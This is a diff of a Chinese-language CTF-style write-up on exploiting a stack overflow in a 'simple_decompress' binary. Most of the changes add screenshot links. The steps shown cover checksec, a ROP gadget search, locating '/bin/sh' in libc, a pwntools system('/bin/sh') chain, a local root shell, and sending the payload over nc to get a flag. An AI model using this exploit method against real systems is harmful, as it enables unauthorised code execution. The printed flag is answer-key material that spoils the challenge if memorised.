@@ -72,19 +72,29 @@ p $rbp - (unsigned long)&ctx.litBuffer    # = 131080 → 返回地址在 litBuff
 
 1. `checksec /out/simple_decompress` → No PIE/No canary/NX → ROP 直打
 2. `ropper --file /out/simple_decompress --search "pop rdi; ret"` → `0x406fa5`
+
+![1-2 checksec+ropper](screenshots/12-checksec-ropper.png)
+
 3. `gdb -q` → `start` → `info proc mappings`(libc 基址 `0x7ffff6ec5000`)→ `find 起点,终点,"/bin/sh"` → `0x7ffff7051e57`
+
+![3-gdb mappings](screenshots/3-gdb-mappings.png)
+![3-gdb find binsh](screenshots/3-gdb-find.png)
+
 4. `/data/python/bin/python3 -i -c "from pwn import *"`(系统 py3.5 太老)
 5. `context.arch='amd64'`(不写报 pack word_size 错)
 6. `elf=ELF(...)`; `rop=ROP(elf)`; `rop.system(binsh)`; `print(rop.dump())` → 链自动拼,
    帧包装手工拼 → /tmp/exploit.poc(131132B)
+
+![6-rop chain + 生成 poc](screenshots/6-rop-chain.png)
+
 7. 本地试弹: `echo 'echo PWNED; id' | bash run.sh /tmp/exploit.poc` → **PWNED, uid=0**
 
-![7-本地PWNED](screenshots/7-local-pwned.png)
+![7-本地 PWNED](screenshots/7-local-pwned.png)
 
 8. 远程: `{ printf '%08x' $(stat -c%s ...); cat ...; echo /usr/local/bin/catflag; } | nc <ip> 8000`
    → **flag{382a280ba097bbedc9cac9ca09d38437}** == MANUAL.md 预期 ✓
 
-![8-远程flag](screenshots/8-remote-flag.png)
+![8-远程 flag](screenshots/8-remote-flag.png)
 
 ## 3. 踩坑记录
 
